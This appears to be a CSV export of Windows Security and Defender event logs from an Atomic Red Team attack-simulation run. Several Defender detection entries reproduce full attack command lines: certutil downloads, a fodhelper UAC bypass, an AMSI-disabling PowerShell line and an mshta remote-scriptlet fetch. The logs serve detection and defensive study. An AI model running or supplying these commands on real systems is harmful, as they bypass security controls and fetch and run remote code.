Level,Date and Time,Source,Event ID,Task Category,More Information
Information,21/05/2020 14:09,SecurityCenter,15,None,Updated Windows Defender status successfully to SECURITY_PRODUCT_STATE_ON.
Information,21/05/2020 14:09,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x344C8

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1740
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x122c
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,21/05/2020 14:09,Microsoft-Windows-Windows Defender,5007,None,"Windows Defender Antivirus Configuration has changed. If this is an unexpected event you should review the settings as this may be the result of malware.
 	Old value: HKLM\SOFTWARE\Microsoft\Windows Defender\SpyNet\DisableBlockAtFirstSeen = 0x1
 	New value: Default\SpyNet\DisableBlockAtFirstSeen = 0x0"
Information,21/05/2020 14:09,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x344C8

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x16f8
	New Process Name:	C:\Program Files\Windows NT\Accessories\wordpad.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x169c
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Warning,21/05/2020 14:09,Microsoft-Windows-Windows Defender,1116,None,"Windows Defender Antivirus has detected malware or other potentially unwanted software.
 For more information please see the following:
https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Ceprolad.A&threatid=2147726914&enterprise=0
 	Name: Trojan:Win32/Ceprolad.A
 	ID: 2147726914
 	Severity: Severe
 	Category: Trojan
 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c cmd /c certutil -urlcache -split -f GITHUB_ATOMIC_RED_TEAM Atomic-license.txt
 	Detection Origin: Unknown
 	Detection Type: Concrete
 	Detection Source: System
 	User: NT AUTHORITY\SYSTEM
 	Process Name: Unknown
 	Security intelligence Version: AV: 1.315.1117.0, AS: 1.315.1117.0, NIS: 1.315.1117.0
 	Engine Version: AM: 1.1.17000.7, NIS: 1.1.17000.7"
Information,21/05/2020 14:09,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x344C8

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x169c
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x122c
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,21/05/2020 14:09,Microsoft-Windows-Windows Defender,1117,None,"Windows Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.
 For more information please see the following:
https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Ceprolad.A&threatid=2147726914&enterprise=0
 	Name: Trojan:Win32/Ceprolad.A
 	ID: 2147726914
 	Severity: Severe
 	Category: Trojan
 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c type EVIL_EXECUTABLE > TeamViewer12_Logfile EVIL_EXECUTABLE & extrac32 PROCEXSP_EXECUTABLE & findstr /V /L W3AllLov3DonaldTrump PROCEXSP_EXECUTABLE > PROCEXSP_EXECUTABLE & certutil_executable -urlcache -split -f GITHUB_ATOMICS_T1096 c:\temp:ttt & makecab AUTORUNS_EXECUTABLE & print /D AUTORUNS_EXECUTABE & reg export EVILREG REGFILE_REG & regedit /E REGFILE_REG HKEY_CURRENT_USER\MyCustomRegKey & expand WEBDAV_BAT FILE_BAT & ESENTULT_EXECUTABLE /y AUTORUNS_EXECUTABLE /d AUTORUNS_EXECUTABLE /o
 	Detection Origin: Unknown
 	Detection Type: Concrete
 	Detection Source: System
 	User: NT AUTHORITY\SYSTEM
 	Process Name: Unknown
 	Action: Remove
 	Action Status:  No additional actions required
 	Error Code: 0x00000000
 	Error description: The operation completed successfully. 
 	Security intelligence Version: AV: 1.315.1117.0, AS: 1.315.1117.0, NIS: 1.315.1117.0
 	Engine Version: AM: 1.1.17000.7, NIS: 1.1.17000.7"
Information,21/05/2020 14:09,Microsoft-Windows-Windows Defender,1117,None,"Windows Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.
 For more information please see the following:
https://go.microsoft.com/fwlink/?linkid=37020&name=VirTool:Win32/DefenderTamperingRestore&threatid=2147741622&enterprise=0
 	Name: VirTool:Win32/DefenderTamperingRestore
 	ID: 2147741622
 	Severity: Severe
 	Category: Tool
 	Path: regkeyvalue:_hklm\software\policies\microsoft\windows defender\\DisableAntiSpyware
 	Detection Origin: Unknown
 	Detection Type: Concrete
 	Detection Source: System
 	User: NT AUTHORITY\SYSTEM
 	Process Name: Unknown
 	Action: Quarantine
 	Action Status:  No additional actions required
 	Error Code: 0x00000000
 	Error description: The operation completed successfully. 
 	Security intelligence Version: AV: 1.315.1117.0, AS: 1.315.1117.0, NIS: 1.315.1117.0
 	Engine Version: AM: 1.1.17000.7, NIS: 1.1.17000.7"
Information,21/05/2020 14:09,Microsoft-Windows-Windows Defender,1117,None,"Windows Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.
 For more information please see the following:
https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Sobocat.A&threatid=2147733729&enterprise=0
 	Name: Trojan:Win32/Sobocat.A
 	ID: 2147733729
 	Severity: Severe
 	Category: Trojan
 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d C:\Windows\System32\cmd.exe /f & reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v DelegateExecute /f & fodhelper.exe
 	Detection Origin: Unknown
 	Detection Type: Concrete
 	Detection Source: System
 	User: NT AUTHORITY\SYSTEM
 	Process Name: Unknown
 	Action: Remove
 	Action Status:  No additional actions required
 	Error Code: 0x00000000
 	Error description: The operation completed successfully. 
 	Security intelligence Version: AV: 1.315.1117.0, AS: 1.315.1117.0, NIS: 1.315.1117.0
 	Engine Version: AM: 1.1.17000.7, NIS: 1.1.17000.7"
Information,21/05/2020 14:09,Microsoft-Windows-Windows Defender,1117,None,"Windows Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.
 For more information please see the following:
https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:PowerShell/PsAttack.A&threatid=2147725500&enterprise=0
 	Name: Trojan:PowerShell/PsAttack.A
 	ID: 2147725500
 	Severity: Severe
 	Category: Trojan
 	Path: CmdLine:_C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe & {[Ref].Assembly.GetType(""AMSIUTILS"").GetField('amsiInitFailed','NonPublic,Static').SetValue(NULL,TRUE)}
 	Detection Origin: Unknown
 	Detection Type: Concrete
 	Detection Source: System
 	User: NT AUTHORITY\SYSTEM
 	Process Name: Unknown
 	Action: Remove
 	Action Status:  No additional actions required
 	Error Code: 0x00000000
 	Error description: The operation completed successfully. 
 	Security intelligence Version: AV: 1.315.1117.0, AS: 1.315.1117.0, NIS: 1.315.1117.0
 	Engine Version: AM: 1.1.17000.7, NIS: 1.1.17000.7"
Information,21/05/2020 14:09,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		SYSTEM
	Account Name:		DESKTOP-P8HTU4V$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x11f4
	New Process Name:	C:\Windows\System32\taskhostw.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x68
	Creator Process Name:	C:\Windows\System32\svchost.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Warning,21/05/2020 14:09,Microsoft-Windows-DistributedCOM,10016,None,"The machine-default permission settings do not grant Local Activation permission for the COM Server application with CLSID 
{C2F03A33-21F5-47FA-B4BB-156362A2F239}
 and APPID 
{316CDED5-E4AE-4B15-9113-7055D84DCC97}
 to the user DESKTOP-P8HTU4V\User SID (S-1-5-21-887719237-3143055800-1059174887-1001) from address LocalHost (Using LRPC) running in the application container Microsoft.Windows.ShellExperienceHost_10.0.18362.387_neutral_neutral_cw5n1h2txyewy SID (S-1-15-2-155514346-2573954481-755741238-1654018636-1233331829-3075935687-2861478708). This security permission can be modified using the Component Services administrative tool."
Warning,21/05/2020 14:09,Microsoft-Windows-Windows Defender,1116,None,"Windows Defender Antivirus has detected malware or other potentially unwanted software.
 For more information please see the following:
https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Kovter.L&threatid=2147752413&enterprise=0
 	Name: Trojan:Win32/Kovter.L
 	ID: 2147752413
 	Severity: Severe
 	Category: Trojan
 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c <MSHTA_EXECUTBLE> javascript:a=(GetObject('script:<ATOMIC_RED_DOMAIN>T1170_mshta.sct')).Exec();close();
 	Detection Origin: Unknown
 	Detection Type: Concrete
 	Detection Source: System
 	User: NT AUTHORITY\SYSTEM
 	Process Name: Unknown
 	Security intelligence Version: AV: 1.315.1117.0, AS: 1.315.1117.0, NIS: 1.315.1117.0
 	Engine Version: AM: 1.1.17000.7, NIS: 1.1.17000.7"
Information,21/05/2020 14:09,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x344C8

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x166c
	New Process Name:	C:\Windows\System32\mshta.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x15dc
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,21/05/2020 14:09,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x344C8

Group:
	Security ID:		BUILTIN\Users
	Group Name:		Users
	Group Domain:		Builtin

Process Information:
	Process ID:		0x1624
	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
Information,21/05/2020 14:09,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x344C8

Group:
	Security ID:		BUILTIN\System Managed Group
	Group Name:		System Managed Accounts Group
	Group Domain:		Builtin

Process Information:
	Process ID:		0x1624
	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
Information,21/05/2020 14:09,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x344C8

Group:
	Security ID:		BUILTIN\Replicator
	Group Name:		Replicator
	Group Domain:		Builtin

Process Information:
	Process ID:		0x1624
	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
Information,21/05/2020 14:09,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x344C8

Group:
	Security ID:		BUILTIN\Remote Management Users
	Group Name:		Remote Management Users
	Group Domain:		Builtin

Process Information:
	Process ID:		0x1624
	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
Information,21/05/2020 14:09,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x344C8

Group:
	Security ID:		BUILTIN\Remote Desktop Users
	Group Name:		Remote Desktop Users
	Group Domain:		Builtin

Process Information:
	Process ID:		0x1624
	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
Information,21/05/2020 14:09,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x344C8

Group:
	Security ID:		BUILTIN\Power Users
	Group Name:		Power Users
	Group Domain:		Builtin

Process Information:
	Process ID:		0x1624
	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
Information,21/05/2020 14:09,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x344C8

Group:
	Security ID:		BUILTIN\Performance Monitor Users
	Group Name:		Performance Monitor Users
	Group Domain:		Builtin

Process Information:
	Process ID:		0x1624
	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
